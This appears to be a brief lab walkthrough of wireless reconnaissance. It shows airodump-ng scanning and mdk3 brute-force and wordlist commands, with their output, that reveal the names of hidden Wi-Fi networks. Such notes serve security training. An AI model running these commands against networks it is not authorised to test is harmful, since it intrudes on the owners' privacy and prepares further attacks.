# Finding Hidden SSID

## Scanning

```sh
my@attack:~$ sudo airodump-ng wlp0s20f0u3mon --channel 1
```

```output title="Output" hl_lines="5-6"
 CH  1 ][ Elapsed: 1 min ][ 2025-04-22 08:43

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 A2:A6:32:1B:29:D5  -28     1800        0    0   1   54   WPA2 CCMP   PSK  <length:  3>
 D2:A3:32:1B:29:D5  -29     1800        0    0   1   54   WPA3 CCMP   SAE  <length:  8>

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   1A:57:51:6D:DD:F0  -49    0 - 1      0        6
 (not associated)   0A:EC:29:63:27:48  -49    0 - 1      0        6
```

## [MDK3](https://github.com/charlesxsh/mdk3-master)

```sh
my@attack:~$ sudo mdk3 wlp0s20f0u3mon p -c 1 -t A2:A6:32:1B:29:D5 -b u
```

```output title="Output" hl_lines="10"
SSID Bruteforce Mode activated!


channel set to: 1
Waiting for beacon frame from target...
Sniffer thread started

SSID is hidden. SSID Length is: 3.

Got response from A2:A6:32:1B:29:D5, SSID: "HTB"
Last try was: HTB
```

## [MDK3](https://github.com/charlesxsh/mdk3-master) (Wordlist Mode)

```sh
my@attack:~$ sudo mdk3 wlp0s20f0u3mon p -c 1 -t D2:A3:32:1B:29:D5 -f wordlist.txt
```

```output title="Output" hl_lines="10"
SSID Wordlist Mode activated!


channel set to: 1
Waiting for beacon frame from target...
Sniffer thread started

SSID is hidden. SSID Length is: 8.

Got response from D2:A3:32:1B:29:D5, SSID: "FreeWifi"
Last try was: (null)
```
